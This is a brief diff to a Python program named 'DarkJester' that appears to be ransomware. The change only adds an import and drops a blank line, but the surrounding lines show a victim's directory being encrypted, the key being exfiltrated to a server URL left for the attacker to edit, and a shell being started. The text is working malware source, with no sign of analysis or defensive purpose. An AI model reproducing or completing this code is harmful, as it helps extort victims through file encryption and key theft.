@@ -26,6 +26,7 @@ import pwd
 from concurrent.futures import ThreadPoolExecutor
 import re
 import pty
+import time
 
 class DarkJester:
     def __init__(self, key_size=32, iv_size=16):
@@ -228,4 +229,3 @@ if __name__ == "__main__":
         jester.encrypt_directory(user_directory, server_url, max_threads=30)
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
     shell.start()
-
